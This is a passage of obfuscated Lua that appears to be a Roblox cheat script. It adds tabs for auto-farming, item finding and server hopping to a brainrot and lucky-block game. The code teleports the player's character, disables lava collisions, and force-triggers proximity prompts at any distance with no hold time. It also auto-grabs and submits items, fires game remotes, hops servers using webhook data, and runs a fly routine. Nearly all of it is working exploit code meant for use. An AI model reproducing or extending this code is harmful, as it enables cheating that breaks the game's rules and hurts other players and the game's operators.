Bomb",coinPrice=0,serverKey="DiscoBomb"},Sledgehammer={displayName="Sledgehammer",coinPrice=0,serverKey="Sledgehammer"},HyperlaserGun={displayName="Hyperlaser Gun",coinPrice=0,serverKey="HyperlaserGun"},RocketLauncher={displayName="Rocket Launcher",coinPrice=0,serverKey="RocketLauncher"},BananaPeel={displayName="Banana Peel",coinPrice=0,serverKey="BananaPeel"},ChickenGear={displayName="Chicken Friend",coinPrice=0,serverKey="ChickenGear"},Drums={displayName="Drums",coinPrice=0,serverKey="Drums"},Harmonica={displayName="Harmonica",coinPrice=0,serverKey="Harmonica"},Trumpet={displayName="Trumpet",coinPrice=0,serverKey="Trumpet"},Trombone={displayName="Trombone",coinPrice=0,serverKey="Trombone"},Violin={displayName="Violin",coinPrice=0,serverKey="Violin"},LB_Common={displayName="Common Lucky Block",coinPrice=0,serverKey="Common Lucky Block (World)"},LB_Rare={displayName="Rare Lucky Block",coinPrice=0,serverKey="Rare Lucky Block (World)"},LB_Epic={displayName="Epic Lucky Block",coinPrice=0,serverKey="Epic Lucky Block (World)"},LB_Legendary={displayName="Legendary Lucky Block",coinPrice=0,serverKey="Legendary Lucky Block (World)"},LB_Mythic={displayName="Mythic Lucky Block",coinPrice=0,serverKey="Mythic Lucky Block (World)"},LB_Secret={displayName="Secret Lucky Block",coinPrice=0,serverKey="Secret Lucky Block (World)"},LB_Celestial={displayName="Celestial Lucky Block",coinPrice=0,serverKey="Celestial Lucky Block (World)"},LB_Godly={displayName="Godly Lucky Block",coinPrice=0,serverKey="Godly Lucky Block (World)"},LB_Magma={displayName="Magma Lucky Block",coinPrice=0,serverKey="Magma Lucky Block"},LB_Food={displayName="Food Lucky Block",coinPrice=0,serverKey="Food Lucky Block"},LB_Dino={displayName="Dino Lucky Block",coinPrice=0,serverKey="Dino Lucky Block"},LB_Aqua={displayName="Aqua Lucky Block",coinPrice=0,serverKey="Aqua Lucky Block"},LB_Forbidden={displayName="Forbidden Lucky Block",coinPrice=0,serverKey="Forbidden Lucky Block"},LB_MoonMagma={displayName="Moon Magma Lucky Block",coinPrice=0,serverKey="Moon Magma Lucky Block"},LB_MoonCelestial={displayName="Moon Celestial Lucky Block",coinPrice=0,serverKey="Moon Celestial Lucky Block"},LB_MoonSecret={displayName="Moon Secret Lucky Block",coinPrice=0,serverKey="Moon Secret Lucky Block"},LB_MoonMythic={displayName="Moon Mythic Lucky Block",coinPrice=0,serverKey="Moon Mythic Lucky Block"}};local v53={"Common Lucky Block","Rare Lucky Block","Epic Lucky Block","Legendary Lucky Block","Mythic Lucky Block","Celestial Lucky Block","Secret Lucky Block","Godly Lucky Block","Magma Lucky Block","Food Lucky Block","Moon Magma Lucky Block","Moon Celestial Lucky Block","Moon Secret Lucky Block","Moon Mythic Lucky Block","Dino Lucky Block","Forbidden Lucky Block"};local v54={"Gold","Emerald","Diamond","Bloodmoon","Rainbow","Aqua"};local v55,v56,v57,v58,v59,v60,v61,v62,v63,v64,v65,v66;v55=v39:CreateTab("Main",4483362458);v56=v39:CreateTab("Auto",4483362458);v57=v39:CreateTab("Brainrot List",4483362458);v58=v39:CreateTab("Brainrot Status",4483362458);v59=v39:CreateTab("Lucky Block Status",4483362458);v60=v39:CreateTab("Shop",4483362458);v61=v39:CreateTab("Hop",4483362458);v62=v39:CreateTab("🚫 Forbidden",4483362458);v63=v39:CreateTab("🎯 Finder",4483362458);v64=v39:CreateTab("Zones",4483362458);v65=v39:CreateTab("Hitbox",4483362458);v66=v39:CreateTab("Extra",4483362458);local function v67(v253,v254) v253=v253 or 5 ;v254=v254 or 3 ;local v255=v40.Character and v40.Character:FindFirstChildOfClass("Humanoid") ;local v256=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if ( not v255 or  not v256) then return;end local v257=v256.CFrame.LookVector;local v258=v256.Position + (Vector3.new(v257.X,0,v257.Z).Unit * v253) ;v255:MoveTo(v258);local v259=tick() + v254 ;repeat task.wait(0.05);until ((v256.Position-v258).Magnitude<1.5) or (tick()>v259)  pcall(function() v255:MoveTo(v256.Position);end);end local function v68(v260) local v261=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v261 then return false;end local v262=(v260.Position-v261.Position).Magnitude;if (v262<=150) then pcall(function() v261.CFrame=v260;end);return true;end local v263=((v262>2000) and 6) or ((v262>800) and 3) or 2 ;local v264=v261.Position;for v660=1,v263-1  do local v661=v660/v263 ;local v662=v264:Lerp(v260.Position,v661);pcall(function() v261.CFrame=CFrame.new(v662 + Vector3.new(0,4,0) );end);task.wait(0.07);v261=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v261 then return false;end end pcall(function() v261.CFrame=v260;end);return true;end local function v69() local v265=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v265 then return false;end local v266=v31();if  not v266 then return false;end local v267=v266:FindFirstChild("YourBaseAtt");local v268=v266:FindFirstChild("Base");local v269=nil;if v267 then v269=v267.WorldPosition + Vector3.new(0,6,0) ;elseif v268 then local v1969=(v268:IsA("Model") and (v268.PrimaryPart or v268:FindFirstChildWhichIsA("BasePart"))) or (v268:IsA("BasePart") and v268) ;if v1969 then v269=v1969.Position + Vector3.new(0,6,0) ;end end if v269 then v68(CFrame.new(v269));return true,v266;end return false;end local function v70(v270) local v271=v270.Parent;while v271 and (v271~=workspace) and (v271~=game)  do if ((v271.Name=="AquaEvent") or (v271.Name=="AquaMap")) then return true;end v271=v271.Parent;end return false;end local v71=nil;local function v72() if v46.lavaRemoved then return;end v46.lavaRemoved=true;for v665,v666 in ipairs(workspace:GetDescendants()) do if (((v666.Name=="Lavas") or (v666.Name=="Lava")) and  not v70(v666)) then pcall(function() if v666:IsA("BasePart") then v666.Transparency=1;v666.CanCollide=false;end end);end end if v71 then v71:Disconnect();end v71=workspace.DescendantAdded:Connect(function(v667) if (((v667.Name=="Lavas") or (v667.Name=="Lava")) and  not v70(v667)) then pcall(function() if v667:IsA("BasePart") then v667.Transparency=1;v667.CanCollide=false;end end);end end);end local v73=function() if (v46.lavaRemoved and  not v46.autoFarmEnabled and  not v46.autoHopCoinEnabled and  not v46.autoHopGodlyEnabled and  not v46.autoHopCelEnabled and  not v46.autoHopFragEnabled) then if v71 then v71:Disconnect();v71=nil;end for v1684,v1685 in ipairs(workspace:GetDescendants()) do if (((v1685.Name=="Lavas") or (v1685.Name=="Lava")) and  not v70(v1685)) then pcall(function() if v1685:IsA("BasePart") then v1685.Transparency=0;v1685.CanCollide=true;end end);end end v46.lavaRemoved=false;end end;local v74,v75={},Vector3.new( -33.360527,4.259904, -54.073788);local v76=nil;task.spawn(function() task.wait(5);while true do task.wait(8);pcall(function() if  not v76 then v76=require(game:GetService("ReplicatedStorage").Modules.EventTimerController);end local v1178=v76;if ( not v1178 or  not v1178.OnGoingTimers) then return;end local function v1179(v1686) return tostring(v1686):gsub("<[^>]+>",""):gsub("&lt;","<"):gsub("&gt;",">");end for v1687,v1688 in pairs(v1178.OnGoingTimers) do local v1689=v1688.UI;if (typeof(v1689)~="Instance") then continue;end local v1690=tonumber(v1688.TimeRemaining) or 0 ;local v1691="";local v1692=v1689:FindFirstChild("NameLabel");local v1693=v1689:FindFirstChild("Title");if (v1692 and v1692:IsA("TextLabel")) then v1691=v1179(v1692.Text);elseif (v1693 and v1693:IsA("TextLabel")) then v1691=v1179(v1693.Text);end if (v1691=="") then continue;end local v1694=tostring(v1687)   .. "_"   .. v1691 ;if  not v74[v1694] then v74[v1694]=true;local v2180="🎉";local v2181=3066993;if v1691:lower():find("coin") then v2180="🪙";v2181=16766720;elseif v1691:lower():find("volcano") then v2180="🌋";v2181=16711680;elseif v1691:lower():find("aqua") then v2180="🌊";v2181=49151;elseif (v1691:lower():find("patric") or v1691:lower():find("shamrock")) then v2180="🍀";v2181=3066993;elseif v1691:lower():find("moon") then v2180="🌙";v2181=9699539;elseif v1691:lower():find("slime") then v2180="🟢";v2181=3394764;end v10(v2180   .. " Event Started: "   .. v1691 ,"Time Remaining: `"   .. math.floor(v1690)   .. "s`" ,v2181);end end local v1180={};for v1695,v1696 in pairs(v1178.OnGoingTimers) do local v1697=v1696.UI;if (typeof(v1697)~="Instance") then continue;end local v1698=v1697:FindFirstChild("NameLabel");local v1699=v1697:FindFirstChild("Title");local v1700=(v1698 and v1698.Text) or (v1699 and v1699.Text) or "" ;v1180[tostring(v1695)   .. "_"   .. v1700 ]=true;end for v1702 in pairs(v74) do if  not v1180[v1702] then v74[v1702]=nil;end end end);end end);local function v77() local v273,v274=pcall(function() return require(game:GetService("ReplicatedStorage").Modules.EventTimerController);end);if ( not v273 or  not v274 or  not v274.OnGoingTimers) then return nil;end local function v275(v668) return tostring(v668):gsub("<[^>]+>",""):gsub("&lt;","<"):gsub("&gt;",">");end for v669,v670 in pairs(v274.OnGoingTimers) do local v671=v670.UI;if (typeof(v671)~="Instance") then continue;end local v672=tonumber(v670.TimeRemaining) or 0 ;local v673=v671:FindFirstChild("NameLabel");if (v673 and v673:IsA("TextLabel") and v275(v673.Text):find("Coin Rain")) then return "active",v672;end local v674=v671:FindFirstChild("Title");if (v674 and v674:IsA("TextLabel") and v275(v674.Text):find("Coin Rain")) then return "queued",v672;end end return nil;end local function v78(v276) local v277=tick() + (v276 or 15) ;while tick()<v277  do if ( not getgenv().OxyoAutoHopCoin or getgenv().OxyoHopStopped) then return nil;end local v675,v676=pcall(function() return require(game:GetService("ReplicatedStorage").Modules.EventTimerController);end);if (v675 and v676 and v676.OnGoingTimers and (next(v676.OnGoingTimers)~=nil)) then return v77();end task.wait(1);end return nil;end local function v79() local v278=workspace:FindFirstChildWhichIsA("SpawnLocation");if v278 then return CFrame.new(v278.Position + Vector3.new(0,5,0) );end return CFrame.new(v32 + Vector3.new(5,3,0) );end local function v80() pcall(function() local v677=game:GetService("ReplicatedStorage"):FindFirstChild("Events");local v678=v677 and v677:FindFirstChild("EquipBest") ;if v678 then v678:FireServer();end end);end local v81=(function() local v279={};local v280=3;local v281=0.07;local v282=2;local v283=0.22;local v284=0.6;local v285=false;local v286=nil;local function v287() return v40.Character;end local function v288() return v287() and v287():FindFirstChild("HumanoidRootPart") ;end local function v289() return v287() and v287():FindFirstChildOfClass("Humanoid") ;end local function v290() local v679=v289();return v679 and (v679.Health>0) and (v288()~=nil) ;end local function v291(v680) local v681=tick() + (v680 or 5) ;while tick()<v681  do if v290() then return true;end task.wait(0.2);end return false;end local function v292(v682) local v683=v288();if  not v683 then return false;end v68(v682.CFrame * CFrame.new(0,3.5,0) );task.wait(v281);v683=v288();if  not v683 then return false;end pcall(function() v683.CFrame=CFrame.new(v682.Position + Vector3.new(0,2.8,0) );end);task.wait(v281);v17(v683,v682,0);task.wait(0.04);return true;end local function v293(v684) if  not v684 then return false;end local v685=v684.HoldDuration;local v686=v684.MaxActivationDistance;pcall(function() v684.HoldDuration=0;v684.MaxActivationDistance=999;end);local v687=false;if (typeof(fireproximityprompt)=="function") then v687=pcall(fireproximityprompt,v684);end if  not v687 then v687=pcall(function() game:GetService("ProximityPromptService"):PromptTriggered(v684,v40);end);end if  not v687 then pcall(function() local v1970=v4:FindFirstChild("Events");local v1971=v1970 and (v1970:FindFirstChild("Interact") or v1970:FindFirstChild("PickUp") or v1970:FindFirstChild("Collect")) ;if v1971 then v1971:FireServer(v684);v687=true;end end);end task.wait(0.04);pcall(function() v684.HoldDuration=v685;v684.MaxActivationDistance=v686;end);return v687;end local function v294(v688) if ( not v688 or  not v688.Parent) then return false;end if  not v291(3) then return false;end local v689=v688.PrimaryPart or v688:FindFirstChildWhichIsA("BasePart") ;if  not v689 then return false;end for v1186=1,v280 do if  not v688.Parent then return false;end if  not v292(v689) then task.wait(0.1);continue;end local v1187=v688:FindFirstChildWhichIsA("ProximityPrompt",true);if v1187 then v293(v1187);end local v1188=tick() + 0.6 ;while v688.Parent and (tick()<v1188)  do task.wait(0.05);end if  not v688.Parent then return true;end if (v1186<v280) then task.wait(v281 * v1186 );end end return  not v688.Parent;end local function v295() local v690=v40.Character;if  not v690 then return false;end for v1189,v1190 in ipairs(v690:GetChildren()) do if v1190:IsA("Model") then if (v1190:FindFirstChildWhichIsA("ProximityPrompt",true) or v1190:GetAttribute("DisplayName") or v1190:GetAttribute("Mutation")) then return true;end end end if (v690:GetAttribute("HoldingBrainrot") or v690:GetAttribute("Carrying") or v690:GetAttribute("IsHolding")) then return true;end for v1191,v1192 in ipairs(v690:GetDescendants()) do if v1192:IsA("ProximityPrompt") then local v1972,v1973=(v1192.ActionText or ""):lower(),(v1192.ObjectText or ""):lower();if (v1972:find("drop") or v1973:find("drop")) then return true;end end end local v691=v40:FindFirstChild("PlayerGui");if v691 then for v1974,v1975 in ipairs(v691:GetDescendants()) do if ((v1975:IsA("TextButton") or v1975:IsA("TextLabel")) and v1975.Visible) then local v2331=(v1975.Text or ""):lower();if ((v2331=="drop") or (v2331=="drop brainrot")) then return true;end end end end return false;end local function v296() local v692=v288();if  not v692 then return false;end if  not v295() then return false;end local v693=v33();local v694=v693.Position;for v1193=1,3 do v692=v288();if  not v692 then return false;end pcall(function() v692.CFrame=CFrame.new(v694 + Vector3.new(0,0, -2.5) );end);task.wait(0.15);v692=v288();if  not v692 then return false;end pcall(function() v692.CFrame=CFrame.new(v694 + Vector3.new(0,0,4) );end);task.wait(0.25);v692=v288();local v1194=v31();if (v692 and v1194 and v1194.Parent) then local v1976=v1194:FindFirstChild("YourBaseAtt");if v1976 then pcall(function() v692.CFrame=CFrame.new(v1976.WorldPosition + Vector3.new(0,3,0) );end);task.wait(0.25);end end if  not v295() then return true;end task.wait(0.2 * v1193 );end return  not v295();end local function v297() for v1195=1,v282 do local v1196=pcall(v296);if v1196 then return;end task.wait(0.2 * v1195 );end end local function v298(v695,v696) local v697={};for v1197,v1198 in ipairs(v695) do v697[v1198]=true;end local v698,v699={},{};for v1200,v1201 in ipairs(v50.brainrots) do if  not v697[v1201.rarity] then continue;end if  not (v1201.obj and v1201.obj.Parent) then continue;end if v699[v1201.obj] then continue;end local v1202,v1203=pcall(function() if ( #v46.selectedMutations>0) then local v2183=v1201.obj:GetAttribute("Mutation") or "Normal" ;local v2184=false;for v2332,v2333 in ipairs(v46.selectedMutations) do if (v2183==v2333) then v2184=true;break;end end if  not v2184 then return false;end end if ( #v46.selectedTraits>0) then local v2185=v46.traitData[v1201.obj];if ( not v2185 or ( #v2185.traitNames==0)) then return false;end local v2186=false;for v2334,v2335 in ipairs(v46.selectedTraits) do for v2412,v2413 in ipairs(v2185.traitNames) do if (v2335==v2413) then v2186=true;break;end end if v2186 then break;end end if  not v2186 then return false;end end return true;end);if (v1202 and v1203) then v699[v1201.obj]=true;table.insert(v698,{obj=v1201.obj,rarity=v1201.rarity,score=v49[v1201.rarity] or 99 });end end table.sort(v698,function(v1204,v1205) return v1204.score<v1205.score ;end);local v700={};for v1206=1,math.min( #v698,v696) do table.insert(v700,v698[v1206]);end return v700;end v279.grab=function(v701) return v294(v701);end;v279.submit=function() return v297();end;v279.isActive=function() return v285;end;v279.start=function(v702) if v285 then v279.stop();task.wait(0.1);end v285=true;local v703={};local v704=true;local v705= -1;local function v706() v704=true;end task.spawn(function() local v1207=v27();local v1208=v1207 and v1207:FindFirstChild("Brainrots") ;if v1208 then for v2187,v2188 in ipairs(v702) do local v2189=v1208:FindFirstChild(v2188);if v2189 then table.insert(v703,v2189.ChildAdded:Connect(v706));table.insert(v703,v2189.ChildRemoved:Connect(v706));end end end end);v286=task.spawn(function() while v285 do if  not v291(10) then task.wait(1);continue;end if v46.grabLock then task.wait(0.15);continue;end if (v704 or (v50.lastScan~=v705)) then v704=false;v705=v50.lastScan;pcall(function() local v2336,v2337={},{};for v2414,v2415 in ipairs(v47) do local v2416=v30(v2415);if v2416 then for v2549,v2550 in ipairs(v2416:GetChildren()) do if (v2550 and v2550.Parent) then local v2578=v2550:GetAttribute("Mutation") or "Normal" ;local v2579=v2550:GetAttribute("DisplayName") or v2550.Name ;local v2580={rarity=v2415,name=v2579,mutation=v2578,obj=v2550};table.insert(v2336,v2580);if (v2578~="Normal") then table.insert(v2337,v2580);end end end end end v50.brainrots=v2336;v50.mutations=v2337;v50.totalCount= #v2336;v50.lastScan=tick();for v2417 in pairs(v46.traitData) do if ( not v2417 or  not v2417.Parent) then v46.traitData[v2417]=nil;end end end);end local v1705=v298(v702,v46.maxCarry);if ( #v1705==0) then task.wait(v284);continue;end local v1706=0;for v1978,v1979 in ipairs(v1705) do if ( not v285 or v46.grabLock) then break;end if  not (v1979.obj and v1979.obj.Parent) then continue;end local v1980,v1981=pcall(v294,v1979.obj);if (v1980 and v1981) then v1706+=1 v704=true;if (v1706<v46.maxCarry) then task.wait(v283);end end end if ((v1706>0) and v285) then pcall(v297);end task.wait(v283);end for v1707,v1708 in ipairs(v703) do pcall(function() v1708:Disconnect();end);end end);end;v279.stop=function() v285=false;if v286 then pcall(task.cancel,v286);v286=nil;end end;return v279;end)();local v82,v83,v84,v85;function v82(v304) return v81.grab(v304);end function v83() return v81.submit();end function v84(v305) v46.collectorRunning=true;v81.start(v305);end function v85() v46.collectorRunning=false;v81.stop();end local function v86(v308) if ( #v46.selectedMutations>0) then local v1209=v308:GetAttribute("Mutation") or "Normal" ;local v1210=false;for v1709,v1710 in ipairs(v46.selectedMutations) do if (v1209==v1710) then v1210=true;break;end end if  not v1210 then return false;end end if ( #v46.selectedTraits>0) then local v1211=v46.traitData[v308];if ( not v1211 or ( #v1211.traitNames==0)) then return false;end local v1212=false;for v1711,v1712 in ipairs(v46.selectedTraits) do for v1982,v1983 in ipairs(v1211.traitNames) do if (v1712==v1983) then v1212=true;break;end end if v1212 then break;end end if  not v1212 then return false;end end return true;end local function v87(v309) if (v46.farmByNameFilter=="") then return false;end local v310=(v309:GetAttribute("DisplayName") or v309.Name):lower();return v310:find(v46.farmByNameFilter:lower(),1,true)~=nil ;end local function v88(v311) for v707,v708 in ipairs(v311:GetChildren()) do if v86(v708) then return v708;end end return nil;end local function v89(v312,v313) local v314=v30(v312);if  not v314 then return;end local v315=v313;if ( not v315 or  not v315.Parent) then v315=v88(v314);end if ( not v315 or  not v315.Parent) then return;end if v82(v315) then pcall(v83);end end local v90={};local v91=0;local function v92(v316,v317) v317=v317 or 180 ;if ((tick() -v91)>=8) then pcall(function() local v1713=getgenv()._OxyoFetchWHEvents;if v1713 then v90=v1713(v317);else v90={};end end);v91=tick();end local v318=os.time();local v319=tostring(game.JobId);for v709,v710 in ipairs(v90) do if (type(v710)~="table") then continue;end if ( not v710.jobId or (v710.jobId==v319)) then continue;end if ((v318-(v710.ts or 0))>v317) then continue;end if ( not v316 or (v710.type and v710.type:lower():find(v316:lower(),1,true))) then return v710.jobId;end end return nil;end local function v93(v320,v321,v322) local v323=0;while getgenv()[v321] and  not getgenv()[v322]  do local v711=v30(v320);if  not v711 then v323+=1 task.wait(2);if (v323>=3) then v323=0;if (getgenv()[v321] and  not getgenv()[v322]) then local v2418=v92(v320:lower(),180);if v2418 then v38:Notify({Title="🎯 Webhook Hop",Content=v320   .. " server found — hopping..." ,Duration=4,Image=4483362458});task.wait(2);if ( not getgenv()[v321] or getgenv()[v322]) then return;end _TPE.hop(v2418);else v38:Notify({Title="😶 Webhook Hop",Content="No "   .. v320   .. " server in webhook — random hop..." ,Duration=3,Image=4483362458});task.wait(math.random(5,10));if (getgenv()[v321] and  not getgenv()[v322]) then task.spawn(function() _TPE.hopRandom();end);end end end end return;end v323=0;local v712={};for v1213,v1214 in ipairs(v711:GetChildren()) do if (v1214 and v1214.Parent) then table.insert(v712,v1214);end end if ( #v712==0) then if (getgenv()[v321] and  not getgenv()[v322]) then local v2191=v92(v320:lower(),180);if v2191 then v38:Notify({Title="🎯 Webhook Hop",Content=v320   .. " server found — hopping..." ,Duration=4,Image=4483362458});task.wait(2);if (getgenv()[v321] and  not getgenv()[v322]) then _TPE.hop(v2191);end else task.wait(math.random(5,10));task.spawn(function() if (getgenv()[v321] and  not getgenv()[v322]) then _TPE.hopRandom();end end);end end return;end for v1215,v1216 in ipairs(v712) do if ( not getgenv()[v321] or getgenv()[v322]) then return;end if (v1216 and v1216.Parent) then local v1984=false;pcall(function() local v2192=v1216:FindFirstChildWhichIsA("ProximityPrompt",true);if (v2192 and ( not v2192.Enabled or  not v2192.ActionEnabled)) then v1984=true;end local v2193=v1216:GetAttribute("Owner") or v1216:GetAttribute("Carrying") or v1216:GetAttribute("IsHeld") ;if (v2193 and (tostring(v2193)~="")) then v1984=true;end end);if  not v1984 then pcall(v82,v1216);pcall(v83);end task.wait(0.3);end end task.wait(0.5);end end local function v94(v324,v325) while getgenv()[v324] and  not getgenv()[v325]  do local v713=v40.Character;local v714=v713 and v713:FindFirstChild("HumanoidRootPart") ;if  not v714 then task.wait(0.5);continue;end local v715,v716={},{};for v1217,v1218 in ipairs(workspace:GetDescendants()) do if  not (v1218 and v1218.Parent) then continue;end local v1219=v1218.Name:lower();if  not (v1219:find("fragment") or (v1219=="frag")) then continue;end if  not (v1218:IsA("BasePart") or v1218:IsA("Model")) then continue;end local v1220=false;local v1221=v1218.Parent;while v1221 and (v1221~=workspace)  do if v716[v1221] then v1220=true;break;end v1221=v1221.Parent;end if  not v1220 then v716[v1218]=true;table.insert(v715,v1218);end end task.wait(0.1);if ( #v715==0) then if (getgenv()[v324] and  not getgenv()[v325]) then local v2194=v92("frag",180);if v2194 then v38:Notify({Title="🔷 Webhook Hop",Content="Fragments server found — hopping...",Duration=4,Image=4483362458});task.wait(2);if (getgenv()[v324] and  not getgenv()[v325]) then _TPE.hop(v2194);end else task.wait(math.random(5,10));task.spawn(function() if (getgenv()[v324] and  not getgenv()[v325]) then _TPE.hopRandom();end end);end end return;end table.sort(v715,function(v1222,v1223) local function v1224(v1715) if v1715:IsA("BasePart") then return v1715.Position;end local v1716,v1717=pcall(function() return v1715:GetModelCFrame();end);return (v1716 and v1717.Position) or Vector3.zero ;end return (v1224(v1222) -v714.Position).Magnitude<(v1224(v1223) -v714.Position).Magnitude ;end);local v717={};local v718=0;for v1225,v1226 in ipairs(v715) do if ( not getgenv()[v324] or getgenv()[v325]) then return;end if (v1226 and v1226.Parent and  not v717[v1226]) then v717[v1226]=true;local v1987=(v1226:IsA("BasePart") and v1226) or v1226.PrimaryPart or v1226:FindFirstChildWhichIsA("BasePart") ;if  not v1987 then continue;end v714=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if  not v714 then break;end v68(v1987.CFrame * CFrame.new(0,4,0) );task.wait(0.15);v714=v40.Character and v40.Character:FindFirstChild("HumanoidRootPart") ;if v714 then pcall(function() v714.CFrame=CFrame.new(v1987.Position + Vector3.new(0,3,0) );end);task.wait(0.2);v17(v714,v1987,0);task.wait(0.05);local v2342=(v1226:IsA("Model") and v1226:GetDescendants()) or {v1226} ;for v2420,v2421 in ipairs(v2342) do if v2421:IsA("ProximityPrompt") then pcall(function() v2421.HoldDuration=0;v2421.MaxActivationDistance=999;end);pcall(function() if (typeof(fireproximityprompt)=="function") then fireproximityprompt(v2421);end end);end end end v718+=1 task.wait(0.3);end end if (v718>0) then pcall(function() local v1988=game:GetService("ReplicatedStorage");local v1989=v1988:FindFirstChild("SubmitFragment");if v1989 then v1989:FireServer();end end);pcall(v83);end task.wait(0.5);end end local function v95() local v326,v327={},{};for v719,v720 in ipairs(v47) do local v721=v30(v720);if v721 then for v1990,v1991 in ipairs(v721:GetChildren()) do if (v1991 and v1991.Parent) then local v2343=v1991:GetAttribute("Mutation") or "Normal" ;local v2344=v1991:GetAttribute("DisplayName") or v1991.Name ;local v2345={rarity=v720,name=v2344,mutation=v2343,obj=v1991};table.insert(v326,v2345);if (v2343~="Normal") then table.insert(v327,v2345);end end end end end v50.brainrots=v326;v50.mutations=v327;v50.totalCount= #v326;v50.lastScan=tick();for v722 in pairs(v46.traitData) do if ( not v722 or  not v722.Parent) then v46.traitData[v722]=nil;end end end local v96={};local function v97() if v50.isRunning then return;end v50.isRunning=true;local v333=true;local v334=tick();local function v335() v333=true;v334=tick();end task.spawn(function() local v723=v27();local v724=v723 and v723:FindFirstChild("Brainrots") ;if v724 then for v1992,v1993 in ipairs(v47) do local v1994=v724:FindFirstChild(v1993);if v1994 then v25.add(v1994.ChildAdded:Connect(v335),"monitor");v25.add(v1994.ChildRemoved:Connect(v335),"monitor");end end end local v725=workspace:FindFirstChild("Brainrots");local v726=v725 and v725:FindFirstChild("Godly") ;if v726 then v25.add(v726.ChildAdded:Connect(v335),"monitor");v25.add(v726.ChildRemoved:Connect(v335),"monitor");end end);v46.monitorThread=task.spawn(function() while v50.isRunning do task.wait(0.8);if  not v333 then continue;end if ((tick() -v334)<0.3) then continue;end v333=false;pcall(v95);pcall(function() for v1995,v1996 in ipairs(v50.brainrots) do if ((v1996.rarity~="Celestial") and (v1996.rarity~="Godly")) then continue;end if  not (v1996.obj and v1996.obj.Parent) then continue;end local v1997=v1996.name   .. "_"   .. v1996.rarity   .. "_"   .. (v1996.mutation or "Normal") ;if v96[v1997] then continue;end v96[v1997]=true;local v1999=((v1996.rarity=="Godly") and "👑") or "🌌" ;local v2000=((v1996.rarity=="Godly") and 16766720) or 10181046 ;v10(v1999   .. " "   .. v1996.rarity   .. " Spotted! "   .. v1999 ,"**"   .. v1996.name   .. "**\nMutation: `"   .. (v1996.mutation or "Normal")   .. "`" ,v2000);end local v1719={};for v2001,v2002 in ipairs(v50.brainrots) do v1719[v2002.name   .. "_"   .. v2002.rarity   .. "_"   .. (v2002.mutation or "Normal") ]=true;end for v2004 in pairs(v96) do if  not v1719[v2004] then v96[v2004]=nil;end end end);end v25.clear("monitor");end);end local v98=nil;local function v99() local v337,v338=pcall(function() return v4.Registries.TraitsRegistry.SetupTraitVFX;end);if ( not v337 or  not v338) then return;end if v98 then v98:Disconnect();end v98=v338.OnClientEvent:Connect(function(v727,v728) if ( not v727 or  not v727.Parent) then return;end local v729="";pcall(function() v729=v728.Name:gsub("VFX$","");end);if (v729=="") then return;end if  not v46.traitData[v727] then v46.traitData[v727]={obj=v727,traitNames={},name=v727:GetAttribute("DisplayName") or v727.Name ,rarity=(v727.Parent and v727.Parent.Name) or "Unknown" ,mutation=v727:GetAttribute("Mutation") or "Normal" };end local v730=false;for v1227,v1228 in ipairs(v46.traitData[v727].traitNames) do if (v1228==v729) then v730=true;break;end end if  not v730 then table.insert(v46.traitData[v727].traitNames,v729);end end);end local v100={Enum.HumanoidStateType.Climbing,Enum.HumanoidStateType.FallingDown,Enum.HumanoidStateType.Flying,Enum.HumanoidStateType.Freefall,Enum.HumanoidStateType.GettingUp,Enum.HumanoidStateType.Landed,Enum.HumanoidStateType.Physics,Enum.HumanoidStateType.PlatformStanding,Enum.HumanoidStateType.Ragdoll,Enum.HumanoidStateType.Running,Enum.HumanoidStateType.RunningNoPhysics,Enum.HumanoidStateType.Seated,Enum.HumanoidStateType.StrafingNoPhysics,Enum.HumanoidStateType.Swimming};local function v101(v339) local v340=v40.Character and v40.Character:FindFirstChildOfClass("Humanoid") ;if  not v340 then return;end for v731,v732 in ipairs(v100) do v340:SetStateEnabled(v732,v339);end v340:SetStateEnabled(Enum.HumanoidStateType.Dead,true);if v339 then v340:ChangeState(Enum.HumanoidStateType.RunningNoPhysics);else v340:ChangeState(Enum.HumanoidStateType.Swimming);end end local v102,v103;local v104={};function v102() local v341=v40.Character;if  not v341 then return;end v46.nowe=true;v46.tpwalking=false;v46.tpwalking=true;task.spawn(function() local v733=v40.Character;local v734=v733 and v733:FindFirstChildWhichIsA("Humanoid") ;while v46.tpwalking and v1.Heartbeat:Wait() and v733 and v734 and v734.Parent  do if (v734.MoveDirection.Magnitude>0) then v733:TranslateBy(v734.MoveDirection * v46.speeds );end end end);pcall(function() v341.Animate.Disabled=true;local v736=v341:FindFirstChildOfClass("Humanoid") or v341:FindFirstChildOfClass("AnimationController") ;if v736 then for v2005,v2006 in next,v736:GetPlayingAnimationTracks() do v2006:AdjustSpeed(0);end end end);v101(false);local v344=v341:FindFirstChildOfClass("Humanoid");local v345=v344 and v344.RigType ;local v346=((v345==Enum.HumanoidRigType.R6) and v341:FindFirstChild("Torso")) or v341:FindFirstChild("UpperTorso") ;if  not v346 then return;end local v347=Instance.new("BodyGyro",v346);v347.P=90000;v347.maxTorque=Vector3.new(8999999488,8999999488,8999999488);v347.cframe=v346.CFrame;local v352=Instance.new("BodyVelocity",v346);v352.velocity=Vector3.new(0,0.1,0);v352.maxForce=Vector3.new(8999999488,8999999488,8999999488);v344.PlatformStand=true;local v356={f=0,b=0,l=0,r=0};local v357={f=0,b=0,l=0,r=0};local v358=50;local v359=0;task.spawn(function() while v46.nowe do if (v345==Enum.HumanoidRigType.R6) then v1.RenderStepped:Wait();else task.wait();end if (((v356.l + v356.r)~=0) or ((v356.f + v356.b)~=0)) then v359=math.min(v359 + 0.5 + (v359/v358) ,v358);elseif (v359~=0) then v359=math.max(v359-1 ,0);end local v1229=workspace.CurrentCamera.CoordinateFrame;if (((v356.l + v356.r)~=0) or ((v356.f + v356.b)~=0)) then v352.velocity=((v1229.lookVector * (v356.f + v356.b)) + ((v1229 * CFrame.new(v356.l + v356.r ,(v356.f + v356.b) * 0.2 ,0).p) -v1229.p)) * v359 ;v357={f=v356.f,b=v356.b,l=v356.l,r=v356.r};elseif (v359~=0) then v352.velocity=((v1229.lookVector * (v357.f + v357.b)) + ((v1229 * CFrame.new(v357.l + v357.r ,(v357.f + v357.b) * 0.2 ,0).p) -v1229.p)) * v359 ;else v352.velocity=Vector3.new(0,0,0);end v347.cframe=workspace.CurrentCamera.CoordinateFrame * CFrame.Angles( -math.rad(((v356.f + v356.b) * 50 * v359)/v358 ),0,0) ;end 